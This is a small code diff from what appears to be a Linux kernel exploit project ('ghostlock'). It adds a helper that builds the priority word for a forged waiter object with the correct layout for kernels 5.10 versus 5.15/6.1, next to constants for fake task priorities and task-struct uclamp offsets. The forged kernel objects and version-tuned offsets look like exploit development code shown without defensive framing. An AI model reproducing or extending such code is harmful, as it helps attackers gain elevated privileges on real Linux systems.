@@ -25,6 +25,16 @@ namespace ghostlock::kernel {
 
     inline constexpr int32_t FAKE_TASK_PRIO = 120;
     inline constexpr int32_t FAKE_WAITER_PRIO = 140;
+    /* TASK_NORMAL; 5.15+ packs (prio << 32) | wake_state at +0x40. */
+    inline constexpr uint32_t FAKE_WAITER_WAKE_STATE = 3;
+
+    /* Family-correct `prio` word at waiter+0x40: 5.10 has `int prio` there
+     * (+0x44 padding); 5.15/6.1 pack {wake_state, prio}. The wrong shape
+     * reads as prio = 0 (highest) and disables the prio-gate arm. */
+    [[nodiscard]] inline constexpr uint64_t waiter_prio_word(uint64_t prio,
+                                                             bool packed_wake_state) noexcept {
+        return packed_wake_state ? ((prio << 32) | FAKE_WAITER_WAKE_STATE) : prio;
+    }
     inline constexpr unsigned FAKE_TASK_UCLAMP_REQ_OFF = 0x350;
     inline constexpr unsigned FAKE_TASK_UCLAMP_OFF = 0x358;
     inline constexpr unsigned FAKE_UCLAMP_ACTIVE_BIT = 16;
